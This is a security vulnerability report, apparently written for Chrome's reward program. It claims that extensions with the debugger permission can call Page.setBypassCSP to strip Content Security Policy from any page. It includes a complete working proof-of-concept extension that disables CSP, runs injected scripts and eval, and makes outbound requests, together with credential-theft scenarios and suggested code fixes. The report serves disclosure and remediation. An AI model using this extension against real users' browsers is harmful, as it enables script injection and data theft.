# VRP Report: Extension CSP Bypass via Page.setBypassCSP Missing Trust Check

## 1. Vulnerability Details

### Type
Logic bug — Missing trust verification in Chrome DevTools Protocol allows untrusted extension clients to completely disable Content Security Policy on any attached page.

### Affected Component
`content/browser/devtools/protocol/page_handler.cc:1844-1847`

### Code Locations

| File | Line | Role |
|------|------|------|
| `content/browser/devtools/protocol/page_handler.cc` | 1844-1847 | **BUG**: `SetBypassCSP()` has no trust check |
| `content/browser/devtools/devtools_session.h` | ~225 | `PageHandler` listed in `IsDomainAvailableToUntrustedClient` |
| `content/browser/renderer_host/navigation_request.cc` | ~10855 | Browser-side: skips CSP addition to PolicyContainer when bypass active |
| `third_party/blink/renderer/core/loader/document_loader.cc` | ~3847 | Renderer-side: returns empty CSP when bypass active |
| `third_party/blink/renderer/core/loader/http_equiv.cc` | ~85 | Meta CSP completely ignored when bypass active |
| `chrome/browser/extensions/api/debugger/debugger_api.cc` | 229-231 | Only Perfetto extension is trusted; all others are untrusted |

### Root Cause

The `Page.setBypassCSP` CDP command completely disables Content Security Policy enforcement for any subsequent navigations on the target page. This command is intended exclusively for trusted DevTools frontends (e.g., Chrome's built-in DevTools), but the implementation lacks any trust verification:

```cpp
// content/browser/devtools/protocol/page_handler.cc:1844-1847
Response PageHandler::SetBypassCSP(bool enabled) {
  bypass_csp_ = enabled;           // ← No trust check whatsoever!
  return Response::FallThrough();
}
```

**Why extensions can invoke this command:**

Chrome uses `IsDomainAvailableToUntrustedClient` to whitelist CDP domains accessible to extensions. The `Page` domain is whitelisted (it contains many benign commands like `Page.captureScreenshot`), but `Page.setBypassCSP` — one of the most security-critical commands in the domain — has no independent trust gate.

**Compare with how other sensitive operations are gated:**

Other PageHandler methods that perform privileged operations check `is_trusted_` before proceeding. `SetBypassCSP` is an outlier that skips this pattern entirely.

**Full effect chain when bypass is active:**

1. Extension calls `Page.setBypassCSP({enabled: true})` → `PageHandler::bypass_csp_` set to true
2. On next navigation/reload, `ShouldBypassCSP()` returns true in `devtools_instrumentation.cc`
3. Browser-side (`navigation_request.cc`): CSP headers are NOT added to the PolicyContainer
4. Renderer-side (`document_loader.cc`): returns empty ContentSecurityPolicy object
5. Renderer-side (`http_equiv.cc`): meta CSP tags are completely ignored
6. **Result**: The page loads with ZERO CSP protection — as if CSP was never configured

---

## 2. Vulnerability Impact

### Prerequisites

| Condition | Details |
|-----------|---------|
| **Extension Permission** | `"debugger"` permission (install-time warning shown) |
| **User Interaction** | Debugging infobar displayed when attaching (user must not dismiss) |
| **Enterprise Scenario** | Policy-installed extensions (`force_installed`): no infobar, fully silent |
| **`--silent-debugging` flag** | No infobar when this CLI flag is present |
| **Target Page** | Any web page (impact highest on pages with strict CSP) |

### Effect (Security Impact)

| Impact Dimension | Description |
|-----------------|-------------|
| **Full XSS Enablement** | Inline scripts, `eval()`, `new Function()`, inline event handlers all become executable |
| **Data Exfiltration** | `connect-src` restrictions removed — arbitrary outbound requests possible |
| **Third-party Script Injection** | `script-src` restrictions removed — any external script loadable |
| **Clickjacking** | `frame-ancestors` restrictions removed |
| **Mixed Content** | `upgrade-insecure-requests` directive disabled |
| **Trust Boundary Violation** | Extension gains Chrome DevTools-frontend-level capability |

### Attack Scenarios

**Scenario 1: Credential Theft on Banking Sites**
1. Malicious extension attaches to banking page
2. Disables CSP → injects keylogger script
3. CSP would normally block inline scripts and data exfiltration — now ineffective

**Scenario 2: Silent Enterprise Attack**
1. Compromised Chrome enterprise policy pushes malicious extension
2. Zero user interaction: silently disables CSP on all pages
3. Injects data collection scripts — employees unaware

**Scenario 3: Bypassing GitHub/Google Strict CSP**
1. These sites rely on strict CSP as the last line of XSS defense
2. With CSP disabled, any reflected/stored XSS becomes exploitable
3. Extension can inject scripts to steal tokens, modify repos, etc.

### Severity: High (Privilege Escalation + Complete CSP Bypass)

---

## 3. Reproduction Steps

### Environment

- **Chrome Version**: Chrome 130+ stable (or any recent version including Canary/Dev/Beta)
- **OS**: Windows / macOS / Linux (all platforms)
- **No special flags or configuration required**

### Step 1: Create PoC Extension

Create a folder `csp_bypass_extension/` with these 3 files:

#### manifest.json
```json
{
  "manifest_version": 3,
  "name": "CSP Bypass PoC",
  "version": "1.0",
  "description": "Demonstrates Page.setBypassCSP available to untrusted extension clients",
  "permissions": ["debugger", "activeTab"],
  "action": {
    "default_popup": "popup.html",
    "default_title": "CSP Bypass PoC"
  }
}
```

#### popup.html
```html
<!DOCTYPE html>
<html>
<head>
  <style>
    body { width: 420px; padding: 16px; font-family: monospace; font-size: 13px; }
    h2 { margin: 0 0 12px 0; font-size: 15px; }
    #log { background: #111; color: #0f0; padding: 10px; height: 260px; overflow-y: auto; white-space: pre-wrap; border-radius: 4px; }
    button { margin-top: 10px; padding: 8px 16px; cursor: pointer; font-size: 13px; }
    .fail { color: #f44; }
    .ok { color: #4f4; }
    .info { color: #ff0; }
  </style>
</head>
<body>
  <h2>Page.setBypassCSP PoC</h2>
  <p>Target: current active tab</p>
  <div id="log"></div>
  <button id="run">Run Exploit</button>
  <script src="popup.js"></script>
</body>
</html>
```

#### popup.js
```javascript
const logEl = document.getElementById('log');
function log(msg, cls) {
  const span = document.createElement('span');
  span.className = cls || '';
  span.textContent = msg + '\n';
  logEl.appendChild(span);
  logEl.scrollTop = logEl.scrollHeight;
}

function sendCommand(tabId, method, params) {
  return new Promise((resolve, reject) => {
    chrome.debugger.sendCommand({tabId}, method, params || {}, (result) => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError.message));
      } else {
        resolve(result);
      }
    });
  });
}

function attach(tabId) {
  return new Promise((resolve, reject) => {
    chrome.debugger.attach({tabId}, "1.3", () => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError.message));
      } else {
        resolve();
      }
    });
  });
}

function detach(tabId) {
  return new Promise((resolve) => {
    chrome.debugger.detach({tabId}, () => resolve());
  });
}

document.getElementById('run').addEventListener('click', async () => {
  try {
    const [tab] = await chrome.tabs.query({active: true, currentWindow: true});
    if (!tab) { log("No active tab found", "fail"); return; }

    log(`[1] Target: ${tab.url}`, "info");

    log("[2] Attaching debugger...");
    await attach(tab.id);
    log("[2] Debugger attached", "ok");

    log("[3] Enabling Page domain...");
    await sendCommand(tab.id, "Page.enable");
    log("[3] Page domain enabled", "ok");

    log("[4] Testing script injection BEFORE bypass...");
    const beforeResult = await sendCommand(tab.id, "Runtime.evaluate", {
      expression: `
        (function() {
          try {
            let s = document.createElement('script');
            s.textContent = 'window.__csp_bypass_test_before = true';
            document.head.appendChild(s);
            return {
              success: !!window.__csp_bypass_test_before,
              note: "inline script executed (CSP may be permissive or absent)"
            };
          } catch(e) {
            return {success: false, error: e.message};
          }
        })()
      `,
      returnByValue: true
    });

    const beforeVal = beforeResult.result.value;
    if (beforeVal && beforeVal.success) {
      log(`[4] Note: page may not have strict CSP (inline script succeeded)`, "info");
      log(`    For best demo, use a page with strict CSP (e.g., github.com)`, "info");
    } else {
      log(`[4] Good: inline script blocked by CSP`, "ok");
    }

    log("[5] Calling Page.setBypassCSP({enabled: true})...", "info");
    await sendCommand(tab.id, "Page.setBypassCSP", {enabled: true});
    log("[5] Page.setBypassCSP SUCCEEDED!", "ok");
    log("    (This should have been rejected for untrusted clients)", "fail");

    log("[6] Reloading page to apply CSP bypass on new document...");
    await sendCommand(tab.id, "Page.reload");
    await new Promise(r => setTimeout(r, 2000));

    log("[7] Testing script injection AFTER bypass...");
    const afterResult = await sendCommand(tab.id, "Runtime.evaluate", {
      expression: `
        (function() {
          let s = document.createElement('script');
          s.textContent = 'window.__csp_bypass_test_after = "BYPASSED"';
          document.head.appendChild(s);

          let evalWorks = false;
          try { eval('evalWorks = true'); } catch(e) {}

          let cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');

          return {
            inlineScript: window.__csp_bypass_test_after === "BYPASSED",
            evalWorks: evalWorks,
            cspMetaPresent: !!cspMeta,
            documentURL: document.URL,
            note: "If inlineScript=true on a CSP-protected page, the bypass worked"
          };
        })()
      `,
      returnByValue: true
    });

    const afterVal = afterResult.result.value;
    log("[7] Results:", "info");
    log(`    Inline script executed: ${afterVal.inlineScript}`, afterVal.inlineScript ? "ok" : "fail");
    log(`    eval() works: ${afterVal.evalWorks}`, afterVal.evalWorks ? "ok" : "fail");
    log(`    Document URL: ${afterVal.documentURL}`);

    if (afterVal.inlineScript) {
      log("\n=== CSP BYPASS CONFIRMED ===", "ok");
      log("Page.setBypassCSP disabled all CSP protections", "ok");
      log("Extension (untrusted client) should NOT have this ability", "fail");
    }

    log("\n[8] Demonstrating fetch to arbitrary origin (CSP connect-src bypass)...");
    const fetchResult = await sendCommand(tab.id, "Runtime.evaluate", {
      expression: `
        (function() {
          try {
            let controller = new AbortController();
            setTimeout(() => controller.abort(), 100);
            fetch('https://httpbin.org/post', {
              method: 'POST',
              body: 'csp_bypass_test=1',
              signal: controller.signal
            }).catch(() => {});
            return {fetchAllowed: true, note: "fetch to arbitrary origin not blocked by CSP"};
          } catch(e) {
            return {fetchAllowed: false, error: e.message};
          }
        })()
      `,
      returnByValue: true
    });

    const fetchVal = fetchResult.result.value;
    log(`    Fetch to external origin: ${fetchVal.fetchAllowed ? "ALLOWED" : "blocked"}`,
        fetchVal.fetchAllowed ? "ok" : "fail");

    log("\n[9] Disabling CSP bypass and detaching...");
    await sendCommand(tab.id, "Page.setBypassCSP", {enabled: false});
    await detach(tab.id);
    log("[9] Cleaned up", "ok");

    log("\n=== PoC Complete ===", "info");
    log("The Page.setBypassCSP command succeeded for an untrusted", "info");
    log("extension client without any IsTrusted() check.", "info");

  } catch(e) {
    log(`ERROR: ${e.message}`, "fail");
    log("Make sure you click 'allow' on the debugging infobar", "info");
  }
});
```

### Step 2: Install the Extension

1. Open Chrome → navigate to `chrome://extensions/`
2. Enable **"Developer mode"** toggle (top-right)
3. Click **"Load unpacked"**
4. Select the `csp_bypass_extension/` folder
5. Extension installs — icon appears in toolbar

### Step 3: Prepare a Test Page

Choose a page with strict CSP (recommended):
- **github.com** — strict `script-src` and `connect-src`
- **accounts.google.com** — strict CSP
- Or any site with CSP headers

Alternatively, use a local test page (`test_csp.html`):
```html
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Security-Policy" 
        content="default-src 'self'; script-src 'none'; connect-src 'none'">
  <title>CSP Test Page</title>
</head>
<body>
  <h1>This page has strict CSP: script-src 'none'</h1>
  <p>No scripts should execute here.</p>
</body>
</html>
```

Serve locally: `python3 -m http.server 8080`, navigate to `http://localhost:8080/test_csp.html`

### Step 4: Execute Verification

1. Navigate to the target page (e.g., github.com)
2. Click the extension icon in the toolbar ("CSP Bypass PoC")
3. A popup appears with the PoC interface
4. A yellow infobar appears: "CSP Bypass PoC started debugging this browser"
5. **Do NOT click cancel** — leave the infobar
6. Click **"Run Exploit"** button
7. Observe the log output

### Step 5: Verify Results

**Success indicators:**
- `[5] Page.setBypassCSP SUCCEEDED!` — command accepted without error
- `[7] Inline script executed: true` — inline script runs on CSP-protected page
- `[7] eval() works: true` — eval executes on CSP-protected page
- `=== CSP BYPASS CONFIRMED ===`

**When testing on github.com:**
- Step [4] should show "Good: inline script blocked by CSP" (CSP active before bypass)
- Step [7] should show "Inline script executed: true" (CSP disabled after bypass)

This demonstrates that an untrusted extension client can completely neutralize CSP protections — a capability that should be exclusive to the trusted Chrome DevTools frontend.

---

## 4. Device Fingerprint

| Field | Value |
|-------|-------|
| **Chrome Version** | All versions supporting CDP Page domain (Chrome 60+) |
| **Build Type** | Release (production) |
| **Platform** | All (Windows/macOS/Linux/ChromeOS) |
| **Required Flags** | None |
| **Required Permissions** | Extension with `debugger` permission |
| **Affected Channels** | Stable, Beta, Dev, Canary |
| **User Interaction** | Debugger infobar (skipped for policy-installed extensions) |
| **Network Requirements** | None (local-only attack) |
| **Renderer Compromise** | Not required |
| **Extension Manifest** | V2 or V3 |

### Attack Surface Variants

| Scenario | Infobar? | User Interaction? |
|----------|----------|-------------------|
| User-installed extension | Yes | Accept once |
| Policy-installed extension (`--force-installed`) | **No** | **None** |
| `--silent-debugging` CLI flag | **No** | **None** |

---

## 5. Suggested Fix

### Option A: Add `is_trusted_` check (Recommended)

```cpp
// content/browser/devtools/protocol/page_handler.cc
Response PageHandler::SetBypassCSP(bool enabled) {
  if (!is_trusted_)
    return Response::InvalidParams("Not allowed for untrusted clients");
  bypass_csp_ = enabled;
  return Response::FallThrough();
}
```

### Option B: Use `AllowUnsafeOperations()` check

```cpp
Response PageHandler::SetBypassCSP(bool enabled) {
  if (!client_->AllowUnsafeOperations())
    return Response::InvalidParams("Operation not allowed");
  bypass_csp_ = enabled;
  return Response::FallThrough();
}
```

### Option C: Per-command restriction in protocol definition

Mark `SetBypassCSP` as requiring trusted client in the CDP protocol definition file, so it is filtered before reaching the handler.

---

## 6. References

- `content/browser/devtools/protocol/page_handler.cc:1844-1847` — Bug location (no trust check)
- `content/browser/devtools/devtools_session.h:~225` — PageHandler in untrusted whitelist
- `content/browser/devtools/devtools_instrumentation.cc:1052-1065` — `ShouldBypassCSP()` consumer
- `content/browser/renderer_host/navigation_request.cc:~10855` — Browser-side CSP skip
- `third_party/blink/renderer/core/loader/document_loader.cc:~3847` — Renderer-side CSP skip
- `third_party/blink/renderer/core/loader/http_equiv.cc:~85` — Meta CSP ignored
- `chrome/browser/extensions/api/debugger/debugger_api.cc:229-231` — Extension trust determination
